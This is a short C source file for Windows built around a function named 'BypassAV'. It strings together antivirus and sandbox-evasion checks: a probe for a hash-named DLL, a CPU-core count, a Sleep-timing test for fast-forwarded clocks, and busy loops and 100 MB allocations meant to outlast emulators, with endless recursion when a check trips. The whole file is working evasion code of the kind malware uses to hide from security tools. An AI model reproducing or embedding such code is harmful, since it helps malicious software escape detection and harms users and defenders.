#include <windows.h>


DWORD WINAPI BypassAV(LPVOID);
void HideWindow();
void Bunny();
void Malloc();

DWORD WINAPI BypassAV(LPVOID params){
	Bunny();

	HINSTANCE DLL = LoadLibrary(TEXT("27a01d4772038a3f83552908e0470604e773f8af.dll"));
	if(DLL != NULL){
		BypassAV(NULL); 
	}

	SYSTEM_INFO SysGuide;
	GetSystemInfo(&SysGuide);
	int CoreNum = SysGuide.dwNumberOfProcessors;
	if(CoreNum < 2){
		BypassAV(NULL);
	}


	int Tick = GetTickCount(); 
	Sleep(1000);			  
	int Tac = GetTickCount(); 
	if((Tac - Tick) < 1000){  
		BypassAV(NULL);		
	}																						

	Bunny();

	return true;
}

void Bunny(){

	double Max = 9999999;
	double Needle = 0;
	for(double i = 0; i < Max; i++){
		Needle++;
	}


	for(int i = 0; i < 8; i++){
		Malloc();
		Start:;
		i++;
		Malloc();
		if((i % 3) == 0){
			goto Start;	
		}
		
	}

}

void Malloc(){

	char * Memdmp = NULL;
	Memdmp = (char *)malloc(100000000);
	if(Memdmp != NULL){
		memset(Memdmp, 00, 100000000);
		free(Memdmp);
	}
}
